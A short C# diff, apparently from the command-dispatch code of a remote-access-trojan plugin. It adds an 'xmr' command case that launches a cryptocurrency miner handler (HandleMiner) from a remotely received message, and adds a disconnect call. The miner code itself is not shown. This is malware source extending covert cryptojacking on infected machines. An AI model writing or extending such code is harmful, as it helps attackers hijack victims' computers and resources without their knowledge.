@@ -34,12 +34,19 @@ namespace Plugin
                             new HandleSendTo().SendToMemory(unpack_msgpack);
                             break;
                         }
+
+                    case "xmr":
+                        {
+                            new HandleMiner(unpack_msgpack);
+                            break;
+                        }
                 }
             }
             catch (Exception ex)
             {
                 Error(ex.Message);
             }
+            Connection.Disconnected();
         }
 
         public static void Error(string ex)
